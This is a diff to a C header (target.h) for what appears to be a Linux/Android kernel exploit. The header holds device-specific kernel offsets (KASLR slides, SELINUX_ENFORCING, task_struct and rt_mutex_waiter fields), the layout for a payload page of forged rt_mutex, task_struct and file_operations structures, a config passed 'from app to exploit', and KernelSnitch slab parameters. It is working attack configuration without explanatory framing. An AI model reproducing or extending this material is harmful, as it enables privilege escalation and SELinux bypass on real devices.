@@ -45,7 +45,7 @@
 #define SELINUX_ENFORCING_OFF               0x026452a8ULL
 #define SLIDE_NFULNL_LOGGER_NAME_OFF        0x017de8b8ULL
 #define SLIDE_NFULNL_LOGGER_OBJECT_OFF      0x023725a0ULL
-#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF  0x0249e7f8ULL
+#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x0249e7f8ULL
 #define SLIDE_SYSCTL_BOOTID_OFF             0x0272a3c9ULL
 
 /* ── _IMAGE: absolute VA at KASLR=0 ────────────────────────────────────── */
@@ -126,6 +126,23 @@
 #define SLIDE_PSELECT_WORD_SHIFT        0
 #define SLIDE_PSELECT_NFDS              0
 
+/* ── KernelSnitch mm_struct / SLUB parameters ───────────────────────────── */
+/*
+ * Verified on-device via:
+ *
+ *   /proc/slabinfo
+ *
+ * Observed:
+ *
+ *   mm_struct 362 448 1024 32 8 : tunables 0 0 0 : slabdata 14 14 0
+ *
+ * Object size  = 1024 bytes = 0x400
+ * Objects/slab = 32
+ * Slab order   = 8
+ */
+#define MM_STRUCT_SZ                    0x400
+#define MM_ORDER                        8
+
 /* ── struct file_operations (BTF, size=0x120) ───────────────────────────── */
 #define SIZEOF_FILE_OPERATIONS          0x120
 #define FOPS_OWNER_OFF                  0x0000
@@ -134,20 +151,21 @@
 #define FOPS_WRITE_OFF                  0x0018
 #define FOPS_READ_ITER_OFF              0x0020
 #define FOPS_WRITE_ITER_OFF             0x0028
-#define FOPS_IOCTL_OFF                  0x0050  /* unlocked_ioctl */
+#define FOPS_IOCTL_OFF                  0x0050
 #define FOPS_COMPAT_IOCTL_OFF           0x0058
 #define FOPS_MMAP_OFF                   0x0060
 #define FOPS_OPEN_OFF                   0x0070
 #define FOPS_RELEASE_OFF                0x0080
 #define FOPS_SPLICE_READ_OFF            0x00c8
 #define FOPS_SHOW_FDINFO_OFF            0x00e0
+
 /* Aliases used by other source files */
 #define FOPS_READ                       FOPS_READ_OFF
 #define FOPS_WRITE                      FOPS_WRITE_OFF
 #define FOPS_READ_ITER                  FOPS_READ_ITER_OFF
 #define FOPS_WRITE_ITER                 FOPS_WRITE_ITER_OFF
-#define FOPS_UNLOCKED_IOCTL             FOPS_IOCTL_OFF
-#define FOPS_COMPAT_IOCTL               FOPS_COMPAT_IOCTL_OFF
+#define FOPS_UNLOCKED_IOCTL              FOPS_IOCTL_OFF
+#define FOPS_COMPAT_IOCTL                FOPS_COMPAT_IOCTL_OFF
 #define FOPS_MMAP                       FOPS_MMAP_OFF
 #define FOPS_OPEN                       FOPS_OPEN_OFF
 #define FOPS_RELEASE                    FOPS_RELEASE_OFF
@@ -169,24 +187,33 @@
 #define TASK_PID                        0x05d8
 
 /* ── struct rt_mutex_waiter (BTF, size=0x58, verified) ──────────────────── */
-#define WAITER_TREE_ENTRY               0x0000
-#define WAITER_PI_TREE_ENTRY            0x0018
-#define WAITER_TASK                     0x0030
-#define WAITER_LOCK                     0x0038
-#define WAITER_WAKE_STATE               0x0040
-#define WAITER_PRIO                     0x0044
-#define WAITER_DEADLINE                 0x0048
-#define WAITER_WW_CTX                   0x0050
+#define WAITER_TREE_ENTRY                0x0000
+#define WAITER_PI_TREE_ENTRY             0x0018
+#define WAITER_TASK                      0x0030
+#define WAITER_LOCK                      0x0038
+#define WAITER_WAKE_STATE                0x0040
+#define WAITER_PRIO                      0x0044
+#define WAITER_DEADLINE                  0x0048
+#define WAITER_WW_CTX                    0x0050
 
-#define FAKE_WAITER_TREE_PRIO_OFF       WAITER_PRIO
-#define FAKE_WAITER_TREE_DEADLINE_OFF   WAITER_DEADLINE
-#define FAKE_WAITER_PI_TREE_ENTRY_OFF   WAITER_PI_TREE_ENTRY
-#define FAKE_WAITER_PI_TREE_PRIO_OFF    WAITER_PRIO
+/* ── rt_mutex_waiter variant ───────────────────────────────────────────── */
+/* BTF confirms: wake_state u32@0x40, prio int@0x44 → COMPACT layout. */
+#define COMPACT_RT_MUTEX_WAITER          1
+
+#define FAKE_WAITER_TREE_PRIO_OFF        WAITER_PRIO
+#define FAKE_WAITER_TREE_DEADLINE_OFF    WAITER_DEADLINE
+
+/* Compatibility aliases used by util.c */
+#define FAKE_WAITER_PRIO_OFF             WAITER_PRIO
+#define FAKE_WAITER_DEADLINE_OFF         WAITER_DEADLINE
+
+#define FAKE_WAITER_PI_TREE_ENTRY_OFF    WAITER_PI_TREE_ENTRY
+#define FAKE_WAITER_PI_TREE_PRIO_OFF     WAITER_PRIO
 #define FAKE_WAITER_PI_TREE_DEADLINE_OFF WAITER_DEADLINE
-#define FAKE_WAITER_TASK_OFF            WAITER_TASK
-#define FAKE_WAITER_LOCK_OFF            WAITER_LOCK
-#define FAKE_WAITER_WAKE_STATE_OFF      WAITER_WAKE_STATE
-#define FAKE_WAITER_WW_CTX_OFF          WAITER_WW_CTX
+#define FAKE_WAITER_TASK_OFF             WAITER_TASK
+#define FAKE_WAITER_LOCK_OFF             WAITER_LOCK
+#define FAKE_WAITER_WAKE_STATE_OFF       WAITER_WAKE_STATE
+#define FAKE_WAITER_WW_CTX_OFF           WAITER_WW_CTX
 
 /* ── struct futex_pi_state (BTF, size=0x58, verified) ───────────────────── */
 #define PI_STATE_LIST                   0x0000
@@ -213,8 +240,8 @@
 #define PWQ_WORK_COLOR_OFF              0x0010
 #define PWQ_REFCNT_OFF                  0x0018
 #define PWQ_NR_IN_FLIGHT_OFF            0x001c
-#define PWQ_NR_ACTIVE_OFF               0x005c
-#define PWQ_MAX_ACTIVE_OFF              0x0060
+#define PWQ_NR_ACTIVE_OFF              0x005c
+#define PWQ_MAX_ACTIVE_OFF             0x0060
 
 /* ── struct worker_pool (BTF) ────────────────────────────────────────────── */
 #define POOL_WORKLIST_OFF               0x0020
@@ -239,54 +266,59 @@
 
 /* ── Payload page layout (offset of each fake struct within payload buffer) */
 /*    All must fit within PAGE_SIZE = 0x1000. FOPS_OFF + 0x700 < 0x1000.   */
-#define LOCK_OFF                    0x000   /* fake rt_mutex_base */
-#define W0_OFF                      0x040   /* fake rt_mutex_waiter w0 */
-#define LEFT_OFF                    0x0a0   /* left rb_node / second waiter */
-#define FAKE_TASK_OFF               0x100   /* fake task_struct (minimal) */
-#define SCRATCH_OFF                 0x200   /* scratch / binary-write target */
-#define FOPS_OFF                    0x300   /* fake file_operations table */
-/* FOPS_OFF + 0x700 = 0xa00 < 0x1000 ✓ */
+#define LOCK_OFF                        0x000
+#define W0_OFF                          0x040
+#define LEFT_OFF                        0x0a0
+#define FAKE_TASK_OFF                   0x100
+#define SCRATCH_OFF                     0x200
+#define FOPS_OFF                        0x300
 
 /* ── Fake rt_mutex owner value (initial: unowned) ────────────────────────── */
-#define SLIDE_LOCK_OWNER_VALUE      0ULL
+#define SLIDE_LOCK_OWNER_VALUE          0ULL
 
 /* ── Fake task_struct field offsets and values ───────────────────────────── */
-#define FAKE_TASK_USAGE_OFF         TASK_USAGE    /* 0x38 */
-#define FAKE_TASK_PRIO_OFF          TASK_PRIO     /* 0x7c */             /* highest-priority fake task */
+#define FAKE_TASK_USAGE_OFF             TASK_USAGE
+#define FAKE_TASK_PRIO_OFF              TASK_PRIO
 
 /* ── Revised payload layout (FAKE_TASK needs 0x8b8 bytes) ───────────────── */
 /*    FAKE_TASK_OFF = 0x340, extends to 0xbf0 — fits within 4K page ✓       */
 /*    FOPS_OFF + 0x700 = 0x900 < 0x1000 ✓                                   */
-#undef  LOCK_OFF
-#define LOCK_OFF                    0x000
-#undef  W0_OFF
-#define W0_OFF                      0x040
-#undef  LEFT_OFF
-#define LEFT_OFF                    0x0a0
-#define RIGHT_OFF                   0x100
-#undef  SCRATCH_OFF
-#define SCRATCH_OFF                 0x160
-#undef  FOPS_OFF
-#define FOPS_OFF                    0x200
-#undef  FAKE_TASK_OFF
-#define FAKE_TASK_OFF               0x340
+#undef LOCK_OFF
+#define LOCK_OFF                        0x000
+
+#undef W0_OFF
+#define W0_OFF                          0x040
+
+#undef LEFT_OFF
+#define LEFT_OFF                        0x0a0
+
+#define RIGHT_OFF                       0x100
+
+#undef SCRATCH_OFF
+#define SCRATCH_OFF                     0x160
+
+#undef FOPS_OFF
+#define FOPS_OFF                        0x200
+
+#undef FAKE_TASK_OFF
+#define FAKE_TASK_OFF                   0x340
 
 /* ── Fake task_struct field aliases ─────────────────────────────────────── */
-#define FAKE_TASK_NORMAL_PRIO_OFF   TASK_NORMAL_PRIO       /* 0x0084 */
-#define FAKE_TASK_PI_LOCK_OFF       TASK_PI_LOCK           /* 0x0884 */
-#define FAKE_TASK_PI_WAITERS_OFF    TASK_PI_WAITERS        /* 0x0898 */
-#define FAKE_TASK_TASK_GROUP_OFF    TASK_SCHED_TASK_GROUP  /* 0x0400 */
-#define FAKE_TASK_PI_TOP_TASK_OFF   TASK_PI_TOP_TASK       /* 0x08a8 */
-#define FAKE_TASK_PI_BLOCKED_ON_OFF TASK_PI_BLOCKED_ON     /* 0x08b0 */
+#define FAKE_TASK_NORMAL_PRIO_OFF       TASK_NORMAL_PRIO
+#define FAKE_TASK_PI_LOCK_OFF           TASK_PI_LOCK
+#define FAKE_TASK_PI_WAITERS_OFF        TASK_PI_WAITERS
+#define FAKE_TASK_TASK_GROUP_OFF        TASK_SCHED_TASK_GROUP
+#define FAKE_TASK_PI_TOP_TASK_OFF       TASK_PI_TOP_TASK
+#define FAKE_TASK_PI_BLOCKED_ON_OFF     TASK_PI_BLOCKED_ON
 
 /* ── Config struct offsets (payload_cfg passed from app to exploit) ──────── */
-#define CFG_BIN_BUFFER_OFF          0x00
-#define CFG_BIN_BUFFER_SIZE_OFF     0x08
-#define CFG_CB_MAX_SIZE_OFF         0x10
-#define CFG_PAGE_OFF                0x18
-#define CFG_NEEDS_READ_FILL_OFF     0x20
+#define CFG_BIN_BUFFER_OFF              0x00
+#define CFG_BIN_BUFFER_SIZE_OFF         0x08
+#define CFG_CB_MAX_SIZE_OFF             0x10
+#define CFG_PAGE_OFF                    0x18
+#define CFG_NEEDS_READ_FILL_OFF         0x20
 
 /* ── ROOT_TASK_GROUP bare alias ──────────────────────────────────────────── */
-#define ROOT_TASK_GROUP             ROOT_TASK_GROUP_IMAGE
+#define ROOT_TASK_GROUP                 ROOT_TASK_GROUP_IMAGE
 
 #endif /* TARGET_H */
